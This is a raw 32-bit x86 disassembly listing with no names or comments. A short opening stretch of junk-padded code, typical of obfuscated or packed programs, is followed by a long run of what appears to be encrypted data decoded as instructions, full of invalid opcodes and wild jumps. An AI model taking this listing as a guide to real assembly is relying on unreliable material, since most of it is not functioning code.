  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   ebp,esi,0x7af10cde
  4028df:	jp     0x40295b
  4028e1:	jp     0x4028ed
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi-0x4f],0x6d6a6a7e
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1f42f8bf
  40298a:	ins    BYTE PTR es:[edi],dx
  40298b:	add    bl,dh
  40298d:	or     al,0x11
  40298f:	aaa    
  402990:	or     ebp,edi
  402992:	stc    
  402993:	shl    BYTE PTR [eax+0x50],cl
  402996:	cmp    BYTE PTR [edi-0x807d29d],bh
  40299c:	addr16 in al,0x80
  40299f:	gs push edi
  4029a1:	rcl    dl,0x94
  4029a4:	push   ecx
  4029a5:	fst    st(6)
  4029a7:	xor    eax,0xb2a2e19c
  4029ac:	inc    ecx
  4029ad:	popf   
  4029ae:	shl    BYTE PTR [ecx],cl
  4029b0:	jl     0x402936
  4029b2:	rol    cl,1
  4029b4:	mov    dh,BYTE PTR [edx]
  4029b6:	pushf  
  4029b7:	push   edx
  4029b8:	push   edx
  4029b9:	jb     0x4029d6
  4029bb:	xor    DWORD PTR [ecx-0x689aa943],eax
  4029c1:	dec    edi
  4029c2:	mov    edx,0xe28f7485
  4029c7:	dec    ebx
  4029c8:	mov    esp,DWORD PTR [ecx]
  4029ca:	and    eax,0x5af3c02f
  4029cf:	bound  ebx,QWORD PTR [edx+0x59]
  4029d2:	jo     0x402a05
  4029d4:	dec    ebx
  4029d5:	add    DWORD PTR [edx-0x25],esp
  4029d8:	or     eax,0xcec54d25
  4029dd:	rcr    BYTE PTR [ebx-0x46f6983c],1
  4029e3:	inc    esi
  4029e4:	loop   0x4029b4
  4029e6:	push   ss
  4029e7:	rcr    BYTE PTR [ebp-0x388f45eb],cl
  4029ed:	arpl   WORD PTR [edx+0x1],ax
  4029f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029f1:	in     eax,dx
  4029f2:	mov    dh,0x6b
  4029f4:	sar    BYTE PTR [ebx],0x50
  4029f7:	push   edx
  4029f8:	cwde   
  4029f9:	mov    DWORD PTR [edx-0x2607e01a],esi
  4029ff:	jg     0x402a60
  402a01:	arpl   cx,di
  402a03:	sbb    eax,0x25bbd9a3
  402a08:	popa   
  402a09:	(bad)  
  402a0a:	nop
  402a0b:	adc    esi,DWORD PTR [ebp+0x3f]
  402a0e:	jge    0x40299f
  402a10:	cmp    BYTE PTR [eax],bh
  402a12:	jp     0x402a3c
  402a14:	mov    ecx,0xf46e3441
  402a19:	add    al,0x95
  402a1b:	cmp    eax,0xcb9daada
  402a20:	dec    ebx
  402a21:	push   ecx
  402a22:	loope  0x402a63
  402a24:	cmp    BYTE PTR [edi-0x3],dl
  402a27:	xchg   ecx,eax
  402a28:	ror    BYTE PTR [esi-0x104437d2],0x82
  402a2f:	mov    bl,0x73
  402a31:	arpl   WORD PTR [ebx],sp
  402a33:	inc    eax
  402a34:	cmc    
  402a35:	std    
  402a36:	sub    al,0xdd
  402a38:	inc    ebp
  402a39:	imul   ebp,DWORD PTR [esi],0x6b
  402a3c:	xchg   esp,eax
  402a3d:	fwait
  402a3e:	push   cs
  402a3f:	adc    BYTE PTR [ebx-0x5d8c1b1b],0x61
  402a46:	aad    0x16
  402a48:	iret   
  402a49:	mov    ebx,0xfa263459
  402a4e:	mov    ah,0x0
  402a50:	sbb    BYTE PTR [edx+eax*2+0x2cb73d6c],0x4d
  402a58:	add    ebx,DWORD PTR [edx+0x3c768fa0]
  402a5e:	call   0xdcd83f88
  402a63:	push   edi
  402a64:	call   0xc65d7fce
  402a69:	or     bl,BYTE PTR [ecx+0x17]
  402a6c:	enter  0x6e20,0x22
  402a70:	stos   DWORD PTR es:[edi],eax
  402a71:	nop
  402a72:	shr    bh,1
  402a74:	pop    edx
  402a75:	cli    
  402a76:	repz call 0x3be4:0xf5356904
  402a7e:	bound  esp,QWORD PTR ds:0x743563ab
  402a84:	outs   dx,DWORD PTR ds:[esi]
  402a85:	jo     0x402a89
  402a87:	cmp    al,0x9
  402a89:	inc    ebx
  402a8a:	aad    0x4a
  402a8c:	(bad)  
  402a8d:	mov    ch,0xe8
  402a8f:	ss jecxz 0x402a1c
  402a92:	or     eax,0xa65822f7
  402a97:	(bad)
  402a9b:	aad    0x8d
  402a9d:	pushf  
  402a9e:	xchg   esi,eax
  402a9f:	and    DWORD PTR ds:0xcaba3362,eax
  402aa5:	fbld   TBYTE PTR [esi+0x61]
  402aa8:	hlt    
  402aa9:	ret    
  402aaa:	xor    DWORD PTR ds:0x3c9fea82,edi
  402ab0:	push   edx
  402ab1:	js     0x402a39
  402ab3:	xchg   DWORD PTR [ebp-0x174119ed],esi
  402ab9:	or     al,0xe4
  402abb:	jns    0x402ab2
  402abd:	jge    0x402ab4
  402abf:	mov    al,fs:0x8b463731
  402ac5:	jmp    0x4682a814
  402aca:	call   0xc08f855c
  402acf:	and    eax,0x629a01fd
  402ad4:	out    0xcd,eax
  402ad6:	add    eax,0xafd2a223
  402adb:	jo     0x402b15
  402add:	sar    dl,0x8b
  402ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae1:	mov    esp,gs
  402ae3:	test   eax,0xe942467e
  402ae8:	pusha  
  402ae9:	(bad)  
  402aea:	pop    esp
  402aeb:	mov    cs,WORD PTR [esi+0x1f3b52e8]
  402af1:	les    esi,FWORD PTR [eax+ecx*4-0x32b7f619]
  402af8:	sbb    esp,DWORD PTR [ebx+0x16a76e66]
  402afe:	mov    dl,0x74
  402b00:	push   esi
  402b01:	inc    ecx
  402b02:	out    dx,eax
  402b03:	(bad)  
  402b04:	nop
  402b05:	or     ebp,DWORD PTR [edx-0x66]
  402b08:	test   al,0xa7
  402b0a:	mov    ecx,0x422abaaa
  402b0f:	mov    dh,0x8
  402b11:	arpl   dx,bx
  402b13:	inc    ecx
  402b14:	in     al,dx
  402b15:	imul   esp,DWORD PTR [ecx+0x215dd880],0xfb1e1092
  402b1f:	jae    0x402b41
  402b21:	fnstsw WORD PTR [edi+0x74e87283]
  402b27:	add    ebx,DWORD PTR [ebp+0x7d]
  402b2a:	loope  0x402aea
  402b2c:	adc    al,0xea
  402b2e:	movaps XMMWORD PTR [edi+0x4b],xmm6
  402b32:	retf   0x4ae1
  402b35:	mov    dl,0x34
  402b37:	xor    DWORD PTR [ecx],0x83c169b6
  402b3d:	cmp    al,0x15
  402b3f:	in     al,dx
  402b40:	dec    ecx
  402b41:	sub    al,0xc2
  402b43:	retf   
  402b44:	sahf   
  402b45:	and    al,BYTE PTR [ebx+esi*2+0x6e86936]
  402b4c:	add    al,0xee
  402b4e:	mov    bl,0xe0
  402b50:	inc    esp
  402b51:	repnz retf 0x9f38
  402b55:	adc    al,0x82
  402b57:	jns    0x402b49
  402b59:	jmp    0xfdfb04cb
  402b5e:	dec    esi
  402b5f:	loop   0x402b12
  402b61:	sbb    esi,DWORD PTR [esi]
  402b63:	mov    cl,0x60
  402b65:	inc    ebp
  402b66:	pusha  
  402b67:	dec    edi
  402b68:	fisttp WORD PTR [eax-0x4fb7d3a3]
  402b6e:	repnz add eax,0xc01b77d7
  402b74:	lahf   
  402b75:	outs   dx,DWORD PTR ds:[esi]
  402b76:	xchg   esi,eax
  402b77:	sub    DWORD PTR [eax+0x5be90c9e],edx
  402b7d:	jns    0x402bf4
  402b7f:	mov    ah,0xc5
  402b81:	add    BYTE PTR [edi-0xf59f325],bl
  402b87:	xchg   ecx,eax
  402b88:	jle    0x402b89
  402b8a:	xor    DWORD PTR [edx-0x7ea87b21],eax
  402b90:	push   esp
  402b91:	mov    ah,0xdc
  402b93:	xchg   esp,eax
  402b94:	test   ecx,0x9fed7938
  402b9a:	cmp    al,0x32
  402b9c:	push   0x16
  402b9e:	sar    bh,1
  402ba0:	push   edx
  402ba1:	sbb    ecx,DWORD PTR [eax-0x18]
  402ba4:	out    0x13,al
  402ba6:	mov    edi,DWORD PTR [ecx+0x73]
  402ba9:	dec    edx
  402baa:	jg     0x402b71
  402bac:	push   esp
  402bad:	rcl    dh,1
  402baf:	mov    edx,0x591aaa59
  402bb4:	dec    esi
  402bb5:	and    al,0xeb
  402bb7:	jbe    0x402bd5
  402bb9:	sub    al,0x6b
  402bbb:	rcl    DWORD PTR [eax-0x76],1
  402bbe:	and    BYTE PTR [edi],bh
  402bc0:	js     0x402c1a
  402bc2:	xchg   edi,eax
  402bc3:	das    
  402bc4:	(bad)  
  402bc5:	hlt    
  402bc6:	pop    ebx
  402bc7:	std    
  402bc8:	out    0x95,eax
  402bca:	mov    esi,0x2542d9f2
  402bcf:	popf   
  402bd0:	test   al,0xe
  402bd2:	es jo  0x402b6d
  402bd5:	and    bl,BYTE PTR [edi+0x553b77bf]
  402bdb:	or     ah,BYTE PTR [ecx]
  402bdd:	mov    ebp,0x32a7f451
  402be2:	ret    0xcdd2
  402be5:	mov    ecx,0x2b66f57e
  402bea:	xchg   edi,eax
  402beb:	pusha  
  402bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bed:	pop    ss
  402bee:	into   
  402bef:	stc    
  402bf0:	in     al,dx
  402bf1:	jg     0x402b9a
  402bf3:	cdq    
  402bf4:	popa   
  402bf5:	call   esi
  402bf7:	div    BYTE PTR [ebx]
  402bf9:	and    al,0xc1
  402bfb:	jp     0x402c17
  402bfd:	mov    ds:0x8ec392e6,al
  402c02:	xor    eax,0x956b9d6
  402c07:	retf   
  402c08:	stos   DWORD PTR es:[edi],eax
  402c09:	inc    ecx
  402c0a:	into   
  402c0b:	adc    ebp,ebp
  402c0d:	mov    edi,ebp
  402c0f:	cld    
  402c10:	mov    cl,BYTE PTR [edi+0x48fbbabd]
  402c16:	push   edx
  402c17:	jle    0x402ba4
  402c19:	jg     0x402bc7
  402c1b:	mov    ecx,0x386d7f16
  402c20:	xor    edx,DWORD PTR [ebx-0xf104e3c]
  402c26:	repz xor al,BYTE PTR [ebp+0x43]
  402c2a:	in     al,0x55
  402c2c:	jo     0x402bb3
  402c2e:	jmp    0x402bfc
  402c30:	dec    BYTE PTR [esi+0x635a236a]
  402c36:	add    dl,al
  402c38:	mov    esi,0xb2bc4a6d
  402c3d:	adc    DWORD PTR [esi+ebx*4+0x23],0x7c
  402c42:	add    dh,cl
  402c44:	jmp    0x16c62e06
  402c49:	jne    0x402c56
  402c4b:	leave  
  402c4c:	imul   esi,DWORD PTR [esi],0x7079615a
  402c52:	les    esp,FWORD PTR [ecx+0x7b]
  402c55:	in     al,dx
  402c56:	pop    edx
  402c57:	inc    ecx
  402c58:	pop    esp
  402c59:	div    BYTE PTR [esi+eiz*1+0x34]
  402c5d:	std    
  402c5e:	(bad)  
  402c5f:	in     eax,dx
  402c60:	es test eax,0x89e2c433
  402c66:	test   BYTE PTR [edx],bl
  402c68:	cmp    eax,0x35b1ef3b
  402c6d:	(bad)  [ebp+ebx*8-0x2446969b]
  402c74:	into   
  402c75:	dec    eax
  402c76:	jbe    0x402cad
  402c78:	imul   edi,DWORD PTR [edi+0x50086ae2],0x6a
  402c7f:	xchg   ebx,eax
  402c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c81:	cwde   
  402c82:	inc    ebx
  402c83:	stos   BYTE PTR es:[edi],al
  402c84:	inc    edx
  402c85:	sti    
  402c86:	(bad)  
  402c87:	cdq    
  402c88:	adc    al,0xd8
  402c8a:	inc    edx
  402c8b:	aaa    
  402c8c:	in     eax,dx
  402c8d:	pop    edx
  402c8e:	mov    ecx,0x9cb17010
  402c93:	(bad)  
  402c94:	dec    edi
  402c95:	rol    BYTE PTR [ebx+0x2185552d],0x94
  402c9c:	imul   edi,DWORD PTR [edi+0x64],0x39409da6
  402ca3:	iret   
  402ca4:	add    edx,DWORD PTR [ebp-0x2e]
  402ca7:	lds    ebp,FWORD PTR ds:0xfa9b0c17
  402cad:	loope  0x402c3f
  402caf:	mov    ch,0xcb
  402cb1:	and    eax,0x31870ae1
  402cb6:	(bad)  
  402cb7:	xor    dh,BYTE PTR ds:0xdbf87dc5
  402cbd:	aas    
  402cbe:	inc    ebp
  402cbf:	mov    DWORD PTR [esi-0x173831a2],ebx
  402cc5:	aad    0x59
  402cc7:	sahf   
  402cc8:	inc    ebp
  402cc9:	pusha  
  402cca:	xchg   BYTE PTR [ecx],dl
  402ccc:	mov    edx,DWORD PTR [ebp-0x2]
  402ccf:	push   ecx
  402cd0:	sbb    eax,DWORD PTR [ebp-0x68737e83]
  402cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd7:	dec    edi
  402cd8:	sbb    bh,dl
  402cda:	es mov cl,0x68
  402cdd:	mov    ebp,0x5795252e
  402ce2:	dec    edi
  402ce3:	in     eax,dx
  402ce4:	ss push esi
  402ce6:	xchg   esp,eax
  402ce7:	test   al,0xa
  402ce9:	cld    
  402cea:	and    DWORD PTR [ebp+0x1b],edi
  402ced:	inc    edi
  402cee:	inc    ebx
  402cef:	xor    esp,esi
  402cf1:	mov    al,0xa9
  402cf3:	or     al,0xf4
  402cf5:	sbb    BYTE PTR [ebx+0x5b],ah
  402cf8:	aam    0xa0
  402cfa:	add    eax,DWORD PTR [eax+0x3a726650]
  402d00:	je     0x402d23
  402d02:	mov    dh,al
  402d04:	stos   DWORD PTR es:[edi],eax
  402d05:	rol    DWORD PTR ds:0x8901d070,0x36
  402d0c:	push   edx
  402d0d:	popa   
  402d0e:	pop    es
  402d0f:	mov    ah,0x8e
  402d11:	add    BYTE PTR [ebx],0x1f
  402d14:	pop    edi
  402d15:	out    dx,eax
  402d16:	into   
  402d17:	aad    0x93
  402d19:	test   DWORD PTR [esi-0xd18893b],esi
  402d1f:	adc    al,0x43
  402d21:	cmc    
  402d22:	jae    0x402d70
  402d24:	(bad)  
  402d25:	mov    ch,0xe3
  402d27:	out    dx,al
  402d28:	jmp    0x402d45
  402d2a:	xor    ch,cl
  402d2c:	sbb    eax,esi
  402d2e:	adc    DWORD PTR [ecx+0x4a],0x8b00e486
  402d35:	test   BYTE PTR [ecx-0x64],cl
  402d38:	jg     0x402d81
  402d3a:	mov    ebp,0x5fe475aa
  402d3f:	inc    DWORD PTR [ebp+0x164197da]
  402d45:	jae    0x402d40
  402d47:	dec    ebp
  402d48:	inc    eax
  402d49:	call   0xdd22398c
  402d4e:	aas    
  402d4f:	aas    
  402d50:	and    eax,0x8f151a5c
  402d55:	push   ss
  402d56:	dec    ebp
  402d57:	ret    
  402d58:	popa   
  402d59:	jne    0x402ce7
  402d5b:	xor    esp,edi
  402d5d:	xchg   esi,eax
  402d5e:	stos   BYTE PTR es:[edi],al
  402d5f:	outs   dx,DWORD PTR ds:[esi]
  402d60:	pushf  
  402d61:	pop    edx
  402d62:	es (bad) 
  402d64:	jp     0x402d90
  402d66:	mov    ebp,0x7b10d82b
  402d6b:	ja     0x402d9b
  402d6d:	jmp    0x402da6
  402d6f:	mov    esi,DWORD PTR [ebp-0x2b039d88]
  402d75:	add    eax,0x639d1220
  402d7a:	popf   
  402d7b:	nop
  402d7c:	cld    
  402d7d:	push   ds
  402d7e:	rcr    DWORD PTR ds:0xb751e678,cl
  402d84:	ins    BYTE PTR es:[edi],dx
  402d85:	or     edx,DWORD PTR [ebp-0xa]
  402d88:	cmc    
  402d89:	dec    ebx
  402d8a:	sub    al,BYTE PTR [ecx+0x6c]
  402d8d:	gs sub eax,0xe609a2f0
  402d93:	inc    esp
  402d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d95:	ret    
  402d96:	stc    
  402d97:	loopne 0x402d3f
  402d99:	retf   
  402d9a:	adc    edx,DWORD PTR [esi+0x6db3d598]
  402da0:	adc    edi,edi
  402da2:	mov    cs,WORD PTR [eax-0x75]
  402da5:	cmp    bh,BYTE PTR [ebx+ebx*8]
  402da8:	cli    
  402da9:	mov    ecx,0x552c89e1
  402dae:	push   edx
  402daf:	mov    ebx,0x1fe548de
  402db4:	jg     0x402df1
  402db6:	cld    
  402db7:	cmp    eax,ebx
  402db9:	mov    ah,0x89
  402dbb:	shl    BYTE PTR [eax-0x56],1
  402dbe:	jmp    FWORD PTR [ebx]
  402dc0:	ror    DWORD PTR [ebp-0x6e11fbc7],0x29
  402dc7:	mov    ebx,0x3be8f9a2
  402dcc:	sub    ah,BYTE PTR [ebp+eax*8-0x287bafd0]
  402dd3:	sbb    eax,0x1fab86d8
  402dd8:	dec    esp
  402dd9:	call   FWORD PTR [edi]
  402ddb:	add    BYTE PTR [edx-0x29],0xed
  402ddf:	sub    ebp,ecx
  402de1:	aas    
  402de2:	or     esp,edi
  402de4:	xlat   BYTE PTR ds:[bx]
  402de6:	xchg   dl,ch
  402de8:	iret   
  402de9:	pop    esi
  402dea:	es xchg ecx,eax
  402dec:	mov    edx,eax
  402dee:	les    esi,FWORD PTR [edi-0x3d]
  402df1:	inc    ebx
  402df2:	add    ah,BYTE PTR [edi+0x32]
  402df5:	add    al,0xe4
  402df7:	jae    0x402e55
  402df9:	sub    al,0xbd
  402dfb:	(bad)  
  402dfd:	jmp    0x402dda
  402dff:	pop    edx
  402e00:	out    dx,eax
  402e01:	jae    0x402e39
  402e03:	sbb    ebp,esp
  402e05:	mov    BYTE PTR [ecx],bh
  402e07:	mov    ebx,0x181d2f76
  402e0c:	mov    bh,0x48
  402e0e:	jmp    0x402e42
  402e10:	add    al,BYTE PTR [ecx-0x42]
  402e13:	out    0x9a,eax
  402e15:	pushf  
  402e16:	fisttp QWORD PTR [esi-0x1c5c3cf5]
  402e1c:	adc    BYTE PTR ds:0xff7a49dc,dh
  402e22:	jne    0x402dfb
  402e24:	mov    ch,0x26
  402e26:	or     BYTE PTR cs:[ecx],0x11
  402e2a:	ret    0xa684
  402e2d:	mov    DWORD PTR [esi],esi
  402e2f:	jmp    0x402e7b
  402e31:	cld    
  402e32:	mul    DWORD PTR [esi]
  402e34:	stc    
  402e35:	mov    ch,0xa
  402e37:	cmp    ebp,0x75412da3
  402e3d:	add    eax,0xef4250a2
  402e42:	inc    ebp
  402e43:	rcr    BYTE PTR [edx],cl
  402e45:	pop    ss
  402e46:	scas   al,BYTE PTR es:[edi]
  402e47:	jnp    0x402ea9
  402e49:	arpl   WORD PTR [edx-0x2b0b64e],cx
  402e4f:	cmp    al,0xa1
  402e51:	das    
  402e52:	pop    edx
  402e53:	inc    edi
  402e54:	ds dec ebx
  402e56:	cs pop edx
  402e58:	push   ebp
  402e59:	sub    eax,0xe2f475cf
  402e5e:	mov    esi,0x2a861f54
  402e63:	jmp    0xde02:0xd032e54c
  402e6a:	lea    esi,[edx]
  402e6c:	mov    ch,0x41
  402e6e:	clc    
  402e6f:	cmc    
  402e70:	je     0x402e70
  402e72:	pop    ebx
  402e73:	mov    DWORD PTR [eax+0x49265a3b],edx
  402e79:	call   FWORD PTR [edi-0x51]
  402e7c:	pop    edx
  402e7d:	push   0x981fd085
  402e82:	ss out dx,eax
  402e84:	aaa    
  402e85:	mov    bh,0x26
  402e87:	sbb    BYTE PTR [esi+0x15675d1d],ah
  402e8d:	dec    eax
  402e8e:	and    BYTE PTR [ebp+edi*2+0x6b5121a2],dh
  402e95:	lds    edi,FWORD PTR [esi-0x24a94ea7]
  402e9b:	sbb    esi,DWORD PTR [ebx+0x3d8e41fc]
  402ea1:	into   
  402ea2:	push   edi
  402ea3:	add    al,0x79
  402ea5:	pop    ebp
  402ea6:	cs lock cmc 
  402ea9:	loopne 0x402eed
  402eab:	enter  0xe82c,0xd6
  402eaf:	jecxz  0x402ecd
  402eb1:	xor    BYTE PTR [ecx],cl
  402eb3:	cs daa 
  402eb5:	stos   DWORD PTR es:[edi],eax
  402eb6:	mov    ds:0x94e8c3e4,al
  402ebb:	das    
  402ebc:	out    dx,eax
  402ebd:	pop    edx
  402ebe:	dec    ecx
  402ebf:	cmp    eax,DWORD PTR [ecx]
  402ec1:	cmp    al,BYTE PTR [esi+edx*2-0xdfb4a9e]
  402ec8:	jp     0x402e7a
  402eca:	call   0x151a:0x75e750a4
  402ed1:	ins    BYTE PTR es:[edi],dx
  402ed2:	or     dl,ch
  402ed4:	adc    al,dl
  402ed6:	and    esi,DWORD PTR [eax-0x2635fbc9]
  402edc:	int    0xd5
  402ede:	push   ds
  402edf:	les    ecx,FWORD PTR [esi+0x1d]
  402ee2:	ja     0x402f11
  402ee4:	(bad)  
  402ee5:	or     DWORD PTR [ecx-0x260d4129],esp
  402eeb:	jne    0x402ef8
  402eed:	xor    BYTE PTR [eax-0x4c95a99e],al
  402ef3:	idiv   DWORD PTR [esi]
  402ef5:	push   es
  402ef6:	mov    edx,DWORD PTR [ebx+ebp*8]
  402ef9:	mov    WORD PTR [eax+0x474a21f7],gs
  402eff:	push   ebp
  402f00:	test   BYTE PTR [ecx*2+0x46cd1597],al
  402f07:	(bad)  
  402f08:	xor    BYTE PTR [esi],cl
  402f0a:	jae    0x402ef0
  402f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f0d:	dec    eax
  402f0e:	push   cs
  402f0f:	pop    ebp
  402f10:	mov    BYTE PTR [esi],cl
  402f12:	shr    DWORD PTR [ebx+0x72],1
  402f15:	push   ds
  402f16:	sbb    BYTE PTR gs:[ebp-0x54],dl
  402f1a:	xor    eax,0x9bc84b9f
  402f1f:	fdiv   QWORD PTR [esi]
  402f21:	(bad)  
  402f22:	daa    
  402f23:	dec    DWORD PTR [edx-0x4cfa43f5]
  402f29:	repz sar DWORD PTR [ebp+0x63],cl
  402f2d:	cwde   
  402f2e:	ret    0x9539
  402f31:	add    eax,0xa5b1b211
  402f36:	xor    DWORD PTR [ebp-0x64],edi
  402f39:	add    al,0x97
  402f3b:	(bad)  
  402f3c:	jp     0x402fb0
  402f3e:	mov    esp,0x7585ae19
  402f43:	retf   
  402f44:	mov    ds,WORD PTR [edx-0x16a500ab]
  402f4a:	into   
  402f4b:	lea    ebp,[ebp+eiz*4-0x75]
  402f4f:	scas   al,BYTE PTR es:[edi]
  402f50:	xchg   esi,eax
  402f51:	bnd ret 
  402f53:	outs   dx,DWORD PTR ds:[esi]
  402f54:	fimul  WORD PTR [eax+0x5d]
  402f57:	xor    DWORD PTR [esi-0x578fe22b],edx
  402f5d:	fldcw  WORD PTR [eax+0x311fd861]
  402f63:	pop    es
  402f64:	lods   eax,DWORD PTR ds:[esi]
  402f65:	mov    ch,0x89
  402f67:	retf   0x23b0
  402f6a:	cmp    DWORD PTR [ebp+esi*8+0x449cf262],ebp
  402f71:	fstp   TBYTE PTR [edi]
  402f73:	jmp    DWORD PTR [ecx-0x4d0fb668]
  402f79:	addr16 inc ecx
  402f7b:	and    cl,BYTE PTR [edi+eax*2+0x4]
  402f7f:	stos   BYTE PTR es:[edi],al
  402f80:	arpl   WORD PTR [ebx+eax*8+0x3d],sp
  402f84:	or     esi,0x74
  402f87:	cmc    
  402f88:	sahf   
  402f89:	cmp    ecx,DWORD PTR [esi-0x27cae635]
  402f8f:	cs pop ss
  402f91:	jge    0x402fa2
  402f93:	fwait
  402f94:	mov    ch,0x88
  402f96:	dec    eax
  402f97:	pop    es
  402f98:	xor    dh,dl
  402f9a:	test   BYTE PTR [ebp-0x7f],ch
  402f9d:	lock enter 0x89fa,0xab
  402fa2:	das    
  402fa3:	jecxz  0x402ff5
  402fa5:	mov    cl,0x97
  402fa7:	push   ebx
  402fa8:	xor    eax,0xe59401cf
  402fad:	and    BYTE PTR [eax+eax*2-0x74bf0cb4],0x21
  402fb5:	dec    eax
  402fb6:	ret    0xb2e8
  402fb9:	data16 sbb al,0xaf
  402fbc:	rcl    DWORD PTR [ebx+0x1030c50c],1
  402fc2:	mov    al,0x2c
  402fc4:	mov    esp,0x1c385cfb
  402fc9:	stc    
  402fca:	push   ebp
  402fcb:	mov    esi,DWORD PTR ds:0xec7826c6
  402fd1:	cli    
  402fd2:	shl    edi,1
  402fd4:	fcom   QWORD PTR [eax-0x57]
  402fd7:	add    al,0x7f
  402fd9:	leave  
  402fda:	(bad)  
  402fdb:	cmp    al,0x36
  402fdd:	repz mov eax,0x9dbb953b
  402fe3:	retf   0xd977
  402fe6:	sbb    al,0xc3
  402fe8:	sbb    eax,ecx
  402fea:	push   ebx
  402feb:	dec    edx
  402fec:	cmp    BYTE PTR [ebx],bh
  402fee:	into   
  402fef:	adc    ah,BYTE PTR [edx]
  402ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff2:	stos   BYTE PTR es:[edi],al
  402ff3:	retf   
  402ff4:	cmp    BYTE PTR [ebx+edx*1],dl
  402ff7:	xor    al,0x1
  402ff9:	mov    dl,0xf3
  402ffb:	int    0x84
  402ffd:	and    BYTE PTR [edx-0x3deac6b6],0xda
  403004:	dec    ebx
  403005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403006:	mov    ds:0xc761af6b,al
  40300b:	add    ebx,DWORD PTR [edi+eax*1-0x611554b7]
  403012:	popf   
  403013:	inc    esi
  403014:	(bad)  
  403016:	gs scas eax,DWORD PTR es:[edi]
  403018:	mov    bh,0x84
  40301a:	ja     0x402fc8
  40301c:	sbb    ecx,esi
